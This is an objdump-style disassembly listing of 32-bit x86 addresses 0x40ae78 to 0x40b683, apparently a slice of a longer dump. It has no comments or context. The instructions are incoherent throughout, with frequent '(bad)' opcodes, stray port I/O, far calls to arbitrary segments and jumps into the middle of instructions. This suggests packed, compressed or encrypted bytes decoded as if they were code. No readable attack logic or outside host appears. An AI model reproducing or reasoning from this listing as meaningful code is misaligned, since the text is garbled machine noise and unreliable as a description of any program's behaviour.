  40ae78:	cmp    ecx,DWORD PTR [ebx]
  40ae7a:	mov    WORD PTR [esi-0x36dd20d1],fs
  40ae80:	mov    WORD PTR [esp+ebp*4],?
  40ae83:	repz push ebp
  40ae85:	not    DWORD PTR [esi]
  40ae87:	mov    BYTE PTR ds:0x49d09e5d,bh
  40ae8d:	jo     0x40ae45
  40ae8f:	jge    0x40ae4c
  40ae91:	mov    ebx,0xbc3e0cef
  40ae96:	test   al,0x87
  40ae98:	inc    eax
  40ae99:	pop    eax
  40ae9a:	xchg   ecx,eax
  40ae9b:	(bad)  
  40ae9c:	jnp    0x40aef1
  40ae9e:	in     al,dx
  40ae9f:	ffreep st(5)
  40aea1:	loop   0x40ae71
  40aea3:	xor    eax,0x2c0c3f52
  40aea8:	sub    al,0xd3
  40aeaa:	sbb    al,0x7
  40aeac:	jne    0x40aea2
  40aeae:	lods   eax,DWORD PTR ds:[esi]
  40aeaf:	add    DWORD PTR [eax-0x10],edi
  40aeb2:	pop    es
  40aeb3:	push   es
  40aeb4:	push   eax
  40aeb5:	in     eax,0x75
  40aeb7:	push   ds
  40aeb8:	(bad)  [ebp+ebp*8+0x106daf00]
  40aebf:	loopne 0x40aef0
  40aec1:	cld    
  40aec2:	call   0x3c2b:0xde27f875
  40aec9:	out    0x6e,eax
  40aecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aecc:	stos   BYTE PTR es:[edi],al
  40aecd:	rcl    edi,cl
  40aecf:	pop    ebp
  40aed0:	ds jg  0x40ae8b
  40aed3:	data16 xlat BYTE PTR ds:[ebx]
  40aed5:	test   eax,0xc993cd5b
  40aeda:	xlat   BYTE PTR ds:[ebx]
  40aedb:	push   ebx
  40aedc:	push   ebx
  40aedd:	in     eax,0x71
  40aedf:	xor    BYTE PTR [eax-0x54],ah
  40aee2:	jg     0x40aee2
  40aee4:	mov    bh,0xa
  40aee6:	inc    ecx
  40aee7:	add    esi,edi
  40aee9:	(bad)  
  40aeea:	push   ebx
  40aeeb:	(bad)  
  40aeec:	pushf  
  40aeed:	in     eax,dx
  40aeee:	addr16 out dx,al
  40aef0:	pushf  
  40aef1:	sbb    DWORD PTR fs:[ebx+0x31a1c23c],esi
  40aef8:	inc    eax
  40aef9:	mov    ebp,0xd8b01a31
  40aefe:	arpl   WORD PTR [ebp-0x1efee24e],ax
  40af04:	mov    esp,0xa70eccb6
  40af09:	inc    eax
  40af0a:	addr16 push 0x29
  40af0d:	jge    0x40aeed
  40af0f:	inc    esp
  40af10:	scas   al,BYTE PTR es:[edi]
  40af11:	jns    0x40ae99
  40af13:	outs   dx,DWORD PTR ds:[esi]
  40af14:	jnp    0x40aebd
  40af16:	popf   
  40af17:	xchg   ebx,eax
  40af18:	push   ebx
  40af19:	daa    
  40af1a:	stos   DWORD PTR es:[edi],eax
  40af1b:	out    0xcb,al
  40af1d:	adc    ah,dl
  40af1f:	in     al,0xce
  40af21:	(bad)  
  40af22:	call   0x73f3:0xaad99417
  40af29:	xchg   esp,eax
  40af2a:	jae    0x40af29
  40af2c:	cmp    al,0x5d
  40af2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af2f:	xchg   ebp,eax
  40af30:	test   al,0x92
  40af32:	leave  
  40af33:	sbb    bl,ch
  40af35:	jns    0x40af83
  40af37:	enter  0x292e,0xa1
  40af3b:	mov    ebp,0xeef8139b
  40af40:	dec    edx
  40af41:	add    dh,BYTE PTR [ebx-0x6f726536]
  40af47:	jecxz  0x40afc8
  40af49:	sbb    eax,0x18c70fbe
  40af4e:	fwait
  40af4f:	mov    dh,0xd
  40af51:	add    esi,DWORD PTR [eax-0x657cbca2]
  40af57:	push   0xffffffc1
  40af59:	std    
  40af5a:	pop    eax
  40af5b:	push   0xb7d9d7c6
  40af60:	call   0x788f:0x17aeb1db
  40af67:	mov    dl,BYTE PTR [ebx-0x2f]
  40af6a:	sti    
  40af6b:	ds call 0x1f93:0x790aa4da
  40af73:	scas   eax,DWORD PTR es:[edi]
  40af74:	cmc    
  40af75:	bound  esi,QWORD PTR [ebx]
  40af77:	(bad)
  40af7a:	scas   eax,DWORD PTR es:[edi]
  40af7b:	mov    ah,0x89
  40af7d:	rol    BYTE PTR [eax-0x4],0xb2
  40af81:	sbb    eax,0xcc9a990
  40af86:	sar    ebp,0xfb
  40af89:	ins    BYTE PTR es:[edi],dx
  40af8a:	mov    ah,0x88
  40af8c:	les    ecx,FWORD PTR ds:0x2da1b3c0
  40af92:	sti    
  40af93:	arpl   si,sp
  40af95:	jno    0x40af57
  40af97:	scas   al,BYTE PTR es:[edi]
  40af98:	ud2    
  40af9a:	push   ebx
  40af9b:	inc    eax
  40af9c:	mov    dl,bl
  40af9e:	adc    eax,0xffffff95
  40afa1:	stos   BYTE PTR es:[edi],al
  40afa2:	xchg   ebp,eax
  40afa3:	idiv   DWORD PTR [edx-0x2c]
  40afa6:	sub    cl,bh
  40afa8:	dec    esi
  40afa9:	cmc    
  40afaa:	sti    
  40afab:	shr    BYTE PTR [eax+0x4791933f],1
  40afb1:	repnz pop eax
  40afb3:	pop    ebx
  40afb4:	outs   dx,BYTE PTR ds:[esi]
  40afb5:	ins    BYTE PTR es:[edi],dx
  40afb6:	pop    ds
  40afb7:	aas    
  40afb8:	lea    ebp,[esi+esi*8-0x35]
  40afbc:	pop    edx
  40afbd:	push   esi
  40afbe:	mov    dl,ch
  40afc0:	cld    
  40afc1:	sbb    eax,eax
  40afc3:	mov    WORD PTR [ecx+0x3b],cs
  40afc6:	pop    esp
  40afc7:	mov    ecx,0x9e9b5028
  40afcc:	add    al,0xae
  40afce:	cmp    eax,0xb0763a19
  40afd3:	std    
  40afd4:	or     BYTE PTR [edi-0x38c66aad],ah
  40afda:	xchg   esi,eax
  40afdb:	fsub   QWORD PTR [esi+0x5304fcf9]
  40afe1:	mov    ds,WORD PTR [eax-0x7cd78039]
  40afe7:	ja     0x40afea
  40afe9:	imul   ebp,esp,0xffffff93
  40afec:	shr    ah,cl
  40afee:	(bad)  
  40afef:	stc    
  40aff0:	inc    edi
  40aff1:	mov    al,0xe5
  40aff3:	push   es
  40aff4:	sahf   
  40aff5:	dec    edx
  40aff6:	rcr    BYTE PTR [ecx+0x6b],cl
  40aff9:	loop   0x40b028
  40affb:	(bad)  
  40affc:	in     al,0x61
  40affe:	ror    DWORD PTR [esi+0x1290fea],0x56
  40b005:	gs stos BYTE PTR es:[edi],al
  40b007:	shl    DWORD PTR [eax+ebx*2+0x48bb4bb7],0x64
  40b00f:	add    BYTE PTR [eax],bh
  40b011:	lods   eax,DWORD PTR ds:[esi]
  40b012:	sbb    al,0x20
  40b014:	add    al,0x6c
  40b016:	mov    ebp,0x187e057
  40b01b:	jmp    0x40b081
  40b01d:	mov    esp,cs
  40b01f:	retf   0x1cc8
  40b022:	les    esp,FWORD PTR ds:[ebx+0x42]
  40b026:	and    edi,DWORD PTR [ecx]
  40b028:	pop    esi
  40b029:	jbe    0x40b01c
  40b02b:	lods   eax,DWORD PTR ds:[esi]
  40b02c:	pop    esi
  40b02d:	rol    DWORD PTR [eax+0x3950a518],0xe8
  40b034:	or     eax,0x8ac90ce6
  40b039:	adc    al,0x7e
  40b03b:	in     eax,0x96
  40b03d:	stos   DWORD PTR es:[edi],eax
  40b03e:	cmp    eax,0x2a1c4a3e
  40b043:	fnstenv [ecx-0x66]
  40b046:	jmp    0xbb5abf72
  40b04b:	out    0xfb,al
  40b04d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b04e:	mov    esp,0xaf1dcfb1
  40b053:	xor    BYTE PTR [esi-0x79],ch
  40b056:	pop    eax
  40b057:	ret    0x7d1c
  40b05a:	call   0x286f:0x53768e14
  40b061:	inc    esi
  40b062:	sbb    esp,DWORD PTR [eax+0x73927d44]
  40b068:	fisttp QWORD PTR [esi+0x2c]
  40b06b:	test   DWORD PTR [edi],ebx
  40b06d:	pop    ebp
  40b06e:	add    BYTE PTR [edx+0x9],cl
  40b071:	sar    DWORD PTR [edi+0x4103c34e],1
  40b077:	shr    BYTE PTR [edi],0xb4
  40b07a:	fstp   DWORD PTR [eax]
  40b07c:	mov    ch,0x31
  40b07e:	push   edi
  40b07f:	jno    0x40b0e0
  40b081:	jle    0x40b02d
  40b083:	mov    ch,0xa
  40b085:	jo     0x40b067
  40b087:	mov    dh,0xb0
  40b089:	mov    edi,DWORD PTR [ecx+0x67]
  40b08c:	adc    DWORD PTR [edx],eax
  40b08e:	mov    ebp,0x1efa00c7
  40b093:	stos   DWORD PTR es:[edi],eax
  40b094:	into   
  40b095:	imul   esp,DWORD PTR [ebx],0x9b8cb402
  40b09b:	fs push cs
  40b09d:	jno    0x40b0e1
  40b09f:	jns    0x40b037
  40b0a1:	mov    ch,0xe0
  40b0a3:	xor    dh,BYTE PTR [edi-0x66]
  40b0a6:	cmp    al,0x6a
  40b0a8:	popf   
  40b0a9:	dec    edx
  40b0aa:	push   edx
  40b0ab:	or     DWORD PTR [esi+edi*8],ebx
  40b0ae:	sub    al,0xd6
  40b0b0:	rcl    BYTE PTR [ecx-0xf54a913],cl
  40b0b6:	fidivr WORD PTR [ecx+0x2c9da147]
  40b0bc:	call   0xaa72:0x40c3deee
  40b0c3:	fadd   QWORD PTR [edx-0x3150b360]
  40b0c9:	push   eax
  40b0ca:	(bad)  [ecx+0x1dd9cc06]
  40b0d0:	jp     0x40b08e
  40b0d2:	xchg   esp,eax
  40b0d3:	xchg   ebx,eax
  40b0d4:	xchg   BYTE PTR [edi-0x36],dh
  40b0d7:	mov    al,ds:0x5302cd4b
  40b0dc:	xor    al,0x1a
  40b0de:	mov    BYTE PTR [esp+edi*4],bl
  40b0e1:	(bad)  
  40b0e3:	mov    bl,ch
  40b0e5:	and    ch,BYTE PTR [esp+edx*2-0x20]
  40b0e9:	mov    ds:0x540d15d0,eax
  40b0ee:	pop    edx
  40b0ef:	in     al,dx
  40b0f0:	and    ebx,DWORD PTR [ecx+0xd3e933d]
  40b0f6:	add    BYTE PTR [ecx],0x68
  40b0f9:	and    BYTE PTR [ebx-0x491ed754],ch
  40b0ff:	mov    ds:0xe33f84d7,al
  40b104:	inc    esp
  40b105:	mov    cl,BYTE PTR [ebx]
  40b107:	mov    eax,0xdb09f632
  40b10c:	test   edx,eax
  40b10e:	je     0x40b106
  40b110:	sub    edi,DWORD PTR [ecx+0x28]
  40b113:	add    DWORD PTR [edx+eax*8-0x65905c63],esi
  40b11a:	out    dx,eax
  40b11b:	sub    BYTE PTR [ecx+0x3c],al
  40b11e:	push   ebx
  40b11f:	(bad)  
  40b120:	mov    esp,0xf44c1f0
  40b125:	cwde   
  40b126:	cs push edx
  40b128:	jmp    0x40b16e
  40b12a:	and    edx,eax
  40b12c:	dec    edx
  40b12d:	add    esi,DWORD PTR [ebx]
  40b12f:	jno    0x40b190
  40b131:	aam    0xc6
  40b133:	push   ecx
  40b134:	pusha  
  40b135:	pushf  
  40b136:	dec    eax
  40b137:	xchg   esp,eax
  40b138:	dec    edi
  40b139:	js     0x40b0ef
  40b13b:	fstp   DWORD PTR ds:0x31e4556c
  40b141:	adc    eax,0xcb2f7c7b
  40b146:	jns    0x40b194
  40b148:	xor    eax,0x2308fe84
  40b14d:	lds    ebx,FWORD PTR [edi+0x36e40494]
  40b153:	inc    esp
  40b154:	mov    ebx,DWORD PTR [edi]
  40b156:	std    
  40b157:	addr16 out 0x4d,al
  40b15a:	arpl   WORD PTR [ecx+0x7be3f141],si
  40b160:	out    0x75,al
  40b162:	mov    ebx,0x8eb2f8e3
  40b167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b168:	call   0xaf97:0xf4790795
  40b16f:	add    eax,DWORD PTR [edi-0x22d850a8]
  40b175:	shl    DWORD PTR [ecx+esi*4-0x7a9eba5],cl
  40b17c:	das    
  40b17d:	pop    eax
  40b17e:	stos   BYTE PTR es:[edi],al
  40b17f:	loop   0x40b121
  40b181:	xor    edx,DWORD PTR [edi-0x17]
  40b184:	mov    ds:0xc1582e18,al
  40b189:	cmp    DWORD PTR [eax+0x5e24c048],eax
  40b18f:	push   edi
  40b190:	dec    esi
  40b191:	pop    DWORD PTR [ebp+0x2398eb8a]
  40b197:	jno    0x40b201
  40b199:	and    al,0x8c
  40b19b:	addr16 pop ss
  40b19d:	sbb    eax,0xf0dbfc1a
  40b1a2:	cmp    ecx,0x79845bd2
  40b1a8:	adc    al,0x50
  40b1aa:	rcl    BYTE PTR [ebp-0x45],cl
  40b1ad:	cmc    
  40b1ae:	imul   edi,DWORD PTR [ecx],0x27
  40b1b1:	test   eax,0x5abcf13b
  40b1b6:	mov    edx,0x43c04d92
  40b1bb:	(bad)  
  40b1bc:	sar    BYTE PTR [ecx+0x7f4c8bec],1
  40b1c2:	or     BYTE PTR [ecx],ah
  40b1c4:	test   BYTE PTR gs:0xdc250b0c,dl
  40b1cb:	mov    ah,ch
  40b1cd:	cmp    BYTE PTR [ecx+0x646fdff9],bh
  40b1d3:	fst    DWORD PTR [eax-0x43]
  40b1d6:	and    ebp,DWORD PTR [ecx-0x5e79b299]
  40b1dc:	dec    BYTE PTR [ebp+0x5ea7e4df]
  40b1e2:	mov    esp,0xf30c07ab
  40b1e7:	sub    dh,BYTE PTR [esp+edi*2-0x47]
  40b1eb:	shl    edi,1
  40b1ed:	xor    ah,0x67
  40b1f0:	(bad)  
  40b1f1:	jmp    0x44f98a92
  40b1f6:	call   0xbfcad55c
  40b1fb:	adc    esp,DWORD PTR [ebx-0x7a]
  40b1fe:	add    ah,ch
  40b200:	lods   al,BYTE PTR ds:[esi]
  40b201:	jp     0x40b234
  40b203:	icebp  
  40b204:	call   0xaaed9ca
  40b209:	cdq    
  40b20a:	fwait
  40b20b:	pop    ebx
  40b20c:	ror    edi,0xaf
  40b20f:	dec    eax
  40b210:	xlat   BYTE PTR ds:[ebx]
  40b211:	pop    edi
  40b212:	sbb    dh,bl
  40b214:	xchg   edi,eax
  40b215:	ja     0x40b270
  40b217:	pop    ebp
  40b218:	or     eax,0x273d3719
  40b21d:	lds    edx,FWORD PTR [edi-0x1d1dcb8e]
  40b223:	es in  al,dx
  40b225:	and    ch,0x93
  40b228:	iret   
  40b229:	pop    eax
  40b22a:	fwait
  40b22b:	mov    edx,0xc7334c2f
  40b230:	outs   dx,BYTE PTR ds:[esi]
  40b231:	call   0x7f6:0x5e8a0d05
  40b238:	out    dx,al
  40b239:	fisttp WORD PTR [esi-0x30c03bb9]
  40b23f:	and    eax,esp
  40b241:	lods   al,BYTE PTR ds:[esi]
  40b242:	mov    WORD PTR [ecx+eax*4+0x71],es
  40b246:	cld    
  40b247:	push   es
  40b248:	push   cs
  40b249:	mov    ebp,0xe792fc15
  40b24e:	xor    eax,DWORD PTR [ebx]
  40b250:	inc    edx
  40b251:	adc    edx,DWORD PTR [ecx]
  40b253:	mov    dl,0x98
  40b255:	or     al,0x16
  40b257:	xor    eax,DWORD PTR [eax+0x259a2588]
  40b25d:	push   ecx
  40b25e:	lahf   
  40b25f:	neg    BYTE PTR [ebx]
  40b261:	pusha  
  40b262:	push   es
  40b263:	mov    ecx,0xc37db4c5
  40b268:	pushf  
  40b269:	loop   0x40b260
  40b26b:	loopne 0x40b216
  40b26d:	mov    dh,BYTE PTR [esi]
  40b26f:	popf   
  40b270:	dec    eax
  40b271:	push   esi
  40b272:	adc    edx,DWORD PTR [edi+0x69]
  40b275:	or     BYTE PTR [edi],dl
  40b277:	lods   eax,DWORD PTR ds:[esi]
  40b278:	or     eax,0xe8b11c3c
  40b27d:	push   edi
  40b27e:	cmp    eax,0x58258590
  40b283:	inc    ebx
  40b284:	xchg   ebx,eax
  40b285:	nop
  40b286:	xor    eax,0x144fde32
  40b28b:	pop    ss
  40b28c:	sahf   
  40b28d:	dec    ebx
  40b28e:	leave  
  40b28f:	cmp    eax,0xc2491786
  40b294:	out    dx,al
  40b295:	ret    0x780d
  40b298:	sub    esi,eax
  40b29a:	push   esi
  40b29b:	lods   eax,DWORD PTR ds:[esi]
  40b29c:	das    
  40b29d:	and    ah,bl
  40b29f:	sub    BYTE PTR [edx-0xd],0x9e
  40b2a3:	mov    ebp,0x2fb552a2
  40b2a8:	mov    cl,0x9a
  40b2aa:	stos   BYTE PTR es:[edi],al
  40b2ab:	aam    0xc0
  40b2ad:	push   cs
  40b2ae:	ror    BYTE PTR ds:0x24398b46,cl
  40b2b4:	and    al,0xa2
  40b2b6:	dec    ebp
  40b2b7:	shl    ebp,1
  40b2b9:	cmpxchg DWORD PTR [ecx],eax
  40b2bc:	stos   BYTE PTR es:[edi],al
  40b2bd:	js     0x40b275
  40b2bf:	jo     0x40b269
  40b2c1:	arpl   WORD PTR [ebx],dx
  40b2c3:	ss dec esp
  40b2c5:	aad    0x4b
  40b2c7:	sbb    BYTE PTR [esi-0x6],bl
  40b2ca:	push   0xfffffff3
  40b2cc:	scas   al,BYTE PTR es:[edi]
  40b2cd:	sbb    dl,BYTE PTR [ebp-0x2e]
  40b2d0:	and    al,0x27
  40b2d2:	and    dl,BYTE PTR [esi-0x21]
  40b2d5:	mov    ch,0x49
  40b2d7:	adc    eax,0x8ce26a68
  40b2dc:	dec    esi
  40b2dd:	mov    edx,0x74a73dd2
  40b2e2:	pushw  0xdef2
  40b2e6:	xlat   BYTE PTR ds:[ebx]
  40b2e7:	inc    eax
  40b2e8:	adc    al,0xf6
  40b2ea:	adc    dl,BYTE PTR [esi]
  40b2ec:	dec    eax
  40b2ed:	adc    BYTE PTR [esi+0x6d],ch
  40b2f0:	sub    DWORD PTR [edx-0x54],eax
  40b2f3:	mov    al,0x8d
  40b2f5:	(bad)  
  40b2f6:	sar    edi,cl
  40b2f8:	mov    edx,0x879592a3
  40b2fd:	sub    eax,0x332645e6
  40b302:	add    al,0x47
  40b304:	and    eax,0xabb1f30c
  40b309:	cmc    
  40b30a:	mov    WORD PTR ds:0x26d0f73b,cs
  40b310:	std    
  40b311:	popf   
  40b312:	lahf   
  40b313:	inc    edx
  40b314:	sbb    ah,cl
  40b316:	out    dx,al
  40b317:	cmp    esi,DWORD PTR [edx-0x65]
  40b31a:	jecxz  0x40b2e1
  40b31c:	sar    BYTE PTR [ecx-0x5cda83cf],0x14
  40b323:	dec    edi
  40b324:	outs   dx,DWORD PTR ds:[esi]
  40b325:	inc    ecx
  40b326:	or     al,0xe4
  40b328:	ins    BYTE PTR es:[edi],dx
  40b329:	mul    esi
  40b32b:	sbb    BYTE PTR [esi+0x3f],bh
  40b32e:	fdiv   st,st(7)
  40b330:	hlt    
  40b331:	sbb    eax,0xeb790917
  40b336:	lock fs pop eax
  40b339:	jns    0x40b2cc
  40b33b:	(bad)  
  40b33c:	out    0xf4,al
  40b33e:	ja     0x40b315
  40b340:	test   bh,ah
  40b342:	loope  0x40b325
  40b344:	dec    ebx
  40b345:	inc    ebp
  40b346:	mov    bl,0x11
  40b348:	sbb    DWORD PTR [esp+edi*8+0xd090751],eax
  40b34f:	cmp    ah,BYTE PTR [ebx]
  40b351:	mov    cl,0x90
  40b353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b354:	int    0xad
  40b356:	dec    edi
  40b357:	imul   ecx,DWORD PTR [edi+0x75ad803],0xb95458ae
  40b361:	sbb    cl,BYTE PTR [edi-0x7]
  40b364:	sub    al,0x3c
  40b366:	pop    eax
  40b367:	and    al,0xdf
  40b369:	pop    esi
  40b36a:	mov    dh,0xbb
  40b36c:	cld    
  40b36d:	cld    
  40b36e:	sbb    DWORD PTR [ecx],edx
  40b370:	int3   
  40b371:	fdiv   QWORD PTR [ecx+0x57ccac1c]
  40b377:	jmp    0x40b310
  40b379:	loopne 0x40b374
  40b37b:	shl    DWORD PTR [esi+0x24],0x4c
  40b37f:	sub    ebx,DWORD PTR [ebp+0x53f9edc0]
  40b385:	sbb    cl,0xc7
  40b388:	mov    esi,0xb4520f5e
  40b38d:	(bad)  
  40b38e:	cmc    
  40b38f:	aad    0xb4
  40b391:	sbb    al,0xff
  40b393:	jne    0x40b336
  40b395:	adc    edi,edx
  40b397:	test   eax,0xe0198e3e
  40b39c:	jb     0x40b331
  40b39e:	outs   dx,BYTE PTR ds:[esi]
  40b39f:	dec    ebp
  40b3a0:	dec    ebp
  40b3a1:	and    BYTE PTR [ecx],ch
  40b3a3:	push   ds
  40b3a4:	arpl   di,bp
  40b3a6:	je     0x40b3f4
  40b3a8:	sbb    DWORD PTR [esi-0x32],0x53
  40b3ac:	push   edi
  40b3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3ae:	(bad)  
  40b3af:	cs ins BYTE PTR es:[edi],dx
  40b3b1:	jecxz  0x40b334
  40b3b3:	dec    esp
  40b3b4:	ins    BYTE PTR es:[edi],dx
  40b3b5:	test   DWORD PTR [ebp-0x2395c503],0xa844bbd4
  40b3bf:	mov    ah,0xe2
  40b3c1:	cmp    esp,esp
  40b3c3:	mov    al,0xed
  40b3c5:	jno    0x40b421
  40b3c7:	in     eax,0x96
  40b3c9:	pop    ebx
  40b3ca:	xchg   edi,eax
  40b3cb:	and    ch,BYTE PTR [ecx+0x4076765d]
  40b3d1:	fnstenv [edx-0x70]
  40b3d4:	call   0x161d0b4e
  40b3d9:	mov    al,ds:0x6fee5900
  40b3de:	and    eax,0xb8b97a00
  40b3e3:	pop    ds
  40b3e4:	les    ebp,FWORD PTR [eax-0x6c22fd1e]
  40b3ea:	sahf   
  40b3eb:	pop    esp
  40b3ec:	xor    cl,bl
  40b3ee:	hlt    
  40b3ef:	out    dx,eax
  40b3f0:	and    eax,0x960aa004
  40b3f5:	cli    
  40b3f6:	out    dx,al
  40b3f7:	xchg   edi,eax
  40b3f8:	dec    edi
  40b3f9:	call   0xe88:0x5685f192
  40b400:	hlt    
  40b401:	cdq    
  40b402:	fidivr DWORD PTR ds:0x2228ab3a
  40b408:	sbb    eax,0x1385fb64
  40b40d:	int    0x12
  40b40f:	ret    
  40b410:	test   al,0x67
  40b412:	dec    ecx
  40b413:	xchg   edx,eax
  40b414:	lahf   
  40b415:	jge    0x40b399
  40b417:	adc    al,0x5f
  40b419:	mov    dh,0x87
  40b41b:	push   esp
  40b41c:	cld    
  40b41d:	mov    ds:0x28b0f8a8,al
  40b422:	add    DWORD PTR [edi-0x46],0x5a
  40b426:	or     eax,0x975a5893
  40b42b:	xchg   ebp,eax
  40b42c:	mov    ah,0x23
  40b42e:	rol    DWORD PTR [ecx],1
  40b430:	or     eax,0x6a957cf1
  40b435:	jg     0x40b40d
  40b437:	push   ds
  40b438:	out    0x6b,al
  40b43a:	jbe    0x40b468
  40b43c:	iret   
  40b43d:	mov    eax,ds:0x9492f62d
  40b442:	pop    eax
  40b443:	stos   DWORD PTR es:[edi],eax
  40b444:	leave  
  40b445:	not    BYTE PTR [edi-0x5278841d]
  40b44b:	out    0x73,al
  40b44d:	fist   DWORD PTR [edx+0x5c931f07]
  40b453:	out    dx,al
  40b454:	fisubr WORD PTR [ebx+0x5d]
  40b457:	sub    ah,BYTE PTR [ecx+0x41]
  40b45a:	jmp    0x931:0xf6c2ab2f
  40b461:	adc    eax,0x8151a12f
  40b466:	iret   
  40b467:	mov    edi,0x68691d95
  40b46c:	jg     0x40b4ca
  40b46e:	imul   ebp,DWORD PTR [edi+0x6f55d366],0x971a1260
  40b478:	loopne 0x40b4c4
  40b47a:	mov    dl,al
  40b47c:	out    dx,al
  40b47d:	stos   BYTE PTR es:[edi],al
  40b47e:	adc    eax,0xdc9e50b8
  40b483:	xlat   BYTE PTR ds:[ebx]
  40b484:	ficomp DWORD PTR [edx-0x315cad5d]
  40b48a:	xlat   BYTE PTR ds:[ebx]
  40b48b:	xlat   BYTE PTR ds:[ebx]
  40b48c:	sbb    eax,edi
  40b48e:	sbb    DWORD PTR [ebp+0x5b],ebp
  40b491:	gs hlt 
  40b493:	bound  edx,QWORD PTR ds:0x9e668c35
  40b499:	inc    DWORD PTR [eax]
	...
  40b513:	add    bh,ah
  40b515:	adc    BYTE PTR [ebp-0x27],bh
  40b518:	(bad)  
  40b519:	std    
  40b51a:	out    0x3e,eax
  40b51c:	lods   eax,DWORD PTR ds:[esi]
  40b51d:	add    dh,ah
  40b51f:	rol    DWORD PTR [ebx+0x35aa05a0],cl
  40b525:	data16 add BYTE PTR [eax],al
  40b528:	outs   dx,BYTE PTR ds:[esi]
  40b529:	pop    es
  40b52a:	add    BYTE PTR [eax],al
  40b52c:	xchg   edx,eax
  40b52d:	jns    0x40b4dd
  40b52f:	lds    ebp,FWORD PTR ds:0xc9555793
  40b535:	cmp    DWORD PTR [edx+eax*2-0x3cbddcb2],0x61
  40b53d:	ins    DWORD PTR es:[edi],dx
  40b53e:	mov    WORD PTR [ebx+0x1c],es
  40b541:	mul    cl
  40b543:	xchg   ebp,eax
  40b544:	(bad)  
  40b545:	cmp    ch,BYTE PTR [edi+0x721b82a2]
  40b54b:	in     al,0xcc
  40b54d:	fs mov edx,0x3aa4f675
  40b553:	adc    dh,BYTE PTR [ebx+ecx*4+0x4530cc1d]
  40b55a:	pusha  
  40b55b:	add    cl,BYTE PTR [edi+0x51288292]
  40b561:	cli    
  40b562:	mov    ecx,0xb171a7ea
  40b567:	test   BYTE PTR [ecx+0x56],ch
  40b56a:	mov    al,0x84
  40b56c:	dec    ebx
  40b56d:	mov    esi,0x6e1fcf66
  40b572:	pop    edi
  40b573:	mov    ah,0x6c
  40b575:	jns    0x40b5ed
  40b577:	shl    DWORD PTR [ebp-0x2c],1
  40b57a:	and    DWORD PTR [ebp-0x63f2ce78],ebx
  40b580:	lea    ebx,[eax-0x44afe608]
  40b586:	outs   dx,BYTE PTR ds:[esi]
  40b587:	add    al,0xf
  40b589:	aaa    
  40b58a:	sub    BYTE PTR [ecx+0x3d36d54b],bl
  40b590:	pop    esi
  40b591:	ins    DWORD PTR es:[edi],dx
  40b592:	jge    0x40b519
  40b594:	sub    BYTE PTR [ebp-0x3c],0xe0
  40b598:	xor    ah,BYTE PTR [esi]
  40b59a:	adc    dl,BYTE PTR [edi-0x3c]
  40b59d:	adc    DWORD PTR [eax+ecx*1+0x6b],ebx
  40b5a1:	addr16 (bad) 
  40b5a3:	pop    ebp
  40b5a4:	call   0x1bbb8273
  40b5a9:	shl    DWORD PTR [esp+eiz*4],0xb2
  40b5ad:	nop
  40b5ae:	fmul   st,st(5)
  40b5b0:	out    0x42,al
  40b5b2:	sub    edi,ebx
  40b5b4:	adc    ah,BYTE PTR [ebx+0x6672b81d]
  40b5ba:	pusha  
  40b5bb:	dec    ecx
  40b5bc:	xchg   edx,eax
  40b5bd:	or     DWORD PTR ds:0x8802cb28,0x5a
  40b5c4:	pop    ecx
  40b5c5:	dec    ebx
  40b5c6:	inc    edx
  40b5c7:	ja     0x40b5cd
  40b5c9:	pop    esi
  40b5ca:	add    DWORD PTR [ecx+0x5d28e628],0x51
  40b5d1:	imul   ebx,DWORD PTR [ecx],0xffffffcf
  40b5d4:	adc    DWORD PTR [edx-0x19],ecx
  40b5d7:	inc    edi
  40b5d8:	dec    esp
  40b5d9:	jnp    0x40b584
  40b5db:	inc    eax
  40b5dc:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b5de:	push   edi
  40b5df:	ds add dh,0xf7
  40b5e3:	push   edx
  40b5e4:	jnp    0x40b5c8
  40b5e6:	pushf  
  40b5e7:	or     bl,dh
  40b5e9:	in     eax,0xcc
  40b5eb:	in     eax,0x17
  40b5ed:	or     DWORD PTR [eax-0x127b3a46],0x815aa0d
  40b5f7:	fld    TBYTE PTR [ebx-0x61]
  40b5fa:	cdq    
  40b5fb:	lods   eax,DWORD PTR ds:[esi]
  40b5fc:	add    eax,0xa6e11ddb
  40b601:	inc    eax
  40b602:	jnp    0x40b65e
  40b604:	bswap  ecx
  40b606:	add    cl,BYTE PTR [edx]
  40b608:	mov    ds:0xb5dfc5e2,al
  40b60d:	inc    edi
  40b60e:	cmp    BYTE PTR [edx+0x1ea36a61],cl
  40b614:	rcl    BYTE PTR [eax-0x5e],1
  40b617:	cmp    al,0xfe
  40b619:	jb     0x40b602
  40b61b:	les    edx,FWORD PTR [edi+0x7b]
  40b61e:	dec    esp
  40b61f:	jl     0x40b612
  40b621:	mov    ebp,0xf0ea3e59
  40b626:	nop
  40b627:	das    
  40b628:	jmp    0xbf650c6e
  40b62d:	jns    0x40b68b
  40b62f:	fadd   QWORD PTR [edx-0x70]
  40b632:	add    al,0x29
  40b634:	ja     0x40b68b
  40b636:	pop    ss
  40b637:	add    eax,0x6777c0e8
  40b63c:	push   0xffffffd1
  40b63e:	call   0xd753:0xfeedd618
  40b645:	lahf   
  40b646:	outs   dx,DWORD PTR ds:[esi]
  40b647:	xor    eax,0x6e89d756
  40b64c:	cli    
  40b64d:	je     0x40b661
  40b64f:	push   esi
  40b650:	add    dh,BYTE PTR [ecx+ecx*8+0x1]
  40b654:	shl    DWORD PTR [edi+0x19ab97d4],cl
  40b65a:	push   eax
  40b65b:	inc    esp
  40b65c:	test   eax,0x26b4dd4
  40b661:	rcr    BYTE PTR [ebx],cl
  40b663:	outs   dx,BYTE PTR ds:[esi]
  40b664:	(bad)  
  40b665:	shl    DWORD PTR [eax],cl
  40b667:	pop    edx
  40b668:	ret    
  40b669:	dec    ebp
  40b66a:	repnz add DWORD PTR [ebp-0x7c],0xffffff91
  40b66f:	aam    0x29
  40b671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b672:	mov    edx,0x12b4bc2
  40b677:	pop    ecx
  40b678:	hlt    
  40b679:	and    bl,BYTE PTR [edx-0x45]
  40b67c:	and    BYTE PTR [edx+0x293abe49],dl
  40b682:	daa    
  40b683:	sbb    BYTE PTR [esi-0x27],cl
